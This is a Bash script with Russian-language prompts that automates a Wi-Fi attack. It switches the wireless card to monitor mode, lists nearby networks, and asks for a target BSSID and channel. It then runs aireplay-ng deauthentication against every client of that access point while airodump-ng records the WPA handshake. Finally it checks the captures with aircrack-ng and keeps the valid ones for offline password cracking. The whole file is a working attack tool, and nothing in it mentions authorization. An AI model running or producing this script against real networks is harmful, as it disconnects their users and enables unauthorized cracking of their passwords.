#!/bin/bash

echo "============================"
echo " Захват WPA handshake + deauth (встроенная карта)"
echo "============================"
echo ""

if [ -z "$SUDO_USER" ]; then
    REAL_HOME="$HOME"
else
    REAL_HOME="/home/$SUDO_USER"
fi

WLAN="wlan0"

if ! iwconfig "$WLAN" 2>/dev/null | grep -q "IEEE 802.11"; then
    echo "ERROR: интерфейс $WLAN не найден или не Wi‑Fi."
    exit 1
fi

echo "Интерфейс: $WLAN"
echo ""

echo "Останавливаем NetworkManager и wpa_supplicant..."
sudo systemctl stop NetworkManager 2>/dev/null || true
sudo systemctl stop wpa_supplicant 2>/dev/null || true

echo "Переводим $WLAN в режим монитора вручную..."
sudo ip link set "$WLAN" down
sudo iw dev "$WLAN" set type monitor
sudo ip link set "$WLAN" up

MON="$WLAN"

echo "Монитор‑интерфейс: $MON"
echo ""

echo "Нажми Ctrl+C, когда увидишь нужную сеть (смотрим ~30 секунд)."
echo ""

sudo timeout 30 airodump-ng "$MON" || true

echo ""
echo "Список сетей ты видел выше."
read -p "BSSID целевой сети: " BSSID
read -p "Имя сети (ESSID, например dlink2): " ESSID
read -p "Канал: " CHANNEL

BASE_DIR="$REAL_HOME/handshakes"
CLEAN_ESSID=$(echo "$ESSID" | tr ' /\\:*?"<>|' '_________')
NET_DIR="$BASE_DIR/$CLEAN_ESSID"

mkdir -p "$NET_DIR"

BASE_FILE="$NET_DIR/handshake_${BSSID//:/-}_$(date +%H%M)"

echo ""
echo "Запускаем захват handshake + deauth:"
echo "BSSID   : $BSSID"
echo "Канал   : $CHANNEL"
echo "Сеть    : $ESSID (папка: $NET_DIR)"
echo ""

echo "Нажми Ctrl+C, когда увидишь WPA handshake: $BSSID"
echo ""

sudo airodump-ng -c "$CHANNEL" --bssid "$BSSID" -w "$BASE_FILE" "$MON" &
CAPTURE_PID=$!

sleep 2
echo "Запускаем deauth для всех клиентов на BSSID $BSSID (60 секунд)..."
sudo aireplay-ng --deauth 60 -a "$BSSID" "$MON" &
DEAUTH_PID=$!

trap 'echo ""; echo "Пользователь нажал Ctrl+C, завершаем..."; sudo kill "$CAPTURE_PID" 2>/dev/null; sudo kill "$DEAUTH_PID" 2>/dev/null; wait "$CAPTURE_PID" 2>/dev/null; wait "$DEAUTH_PID" 2>/dev/null' INT

wait "$CAPTURE_PID" 2>/dev/null || true
sudo kill "$DEAUTH_PID" 2>/dev/null
wait "$DEAUTH_PID" 2>/dev/null

ps aux | grep -q "airodump-ng.*$BSSID.*-w" && sudo killall airodump-ng

echo "Захват завершён."
echo ""

HAS_HANDSHAKE=false

CAP_FILES=("$NET_DIR"/*"${BSSID//:/-}"_*.cap*)

for f in "${CAP_FILES[@]}"; do
    if [ -f "$f" ]; then
        if aircrack-ng "$f" 2>&1 | grep -q "1 handshake"; then
            echo "✅ Handshake найден в: $f"
            HAS_HANDSHAKE=true
        else
            echo "❌ Handshake НЕ найден в: $f → удаляем файлы."
            rm -f "$f"*
        fi
    fi
done

if [ "$HAS_HANDSHAKE" = false ]; then
    echo "⚠️ Handshake не найден НИ в одном файле — папка $NET_DIR пуста или все файлы удалены."
else
    echo "Handshake сохранён успешно."
fi

echo "Возвращаем интерфейс в managed‑режим..."
sudo ip link set "$MON" down
sudo iw dev "$MON" set type managed
sudo ip link set "$MON" up

echo "Запускаем NetworkManager и wpa_supplicant..."
sudo systemctl start NetworkManager
sudo systemctl start wpa_supplicant

echo "Интерфейс $WLAN снова в обычном режиме."
echo "Выход."
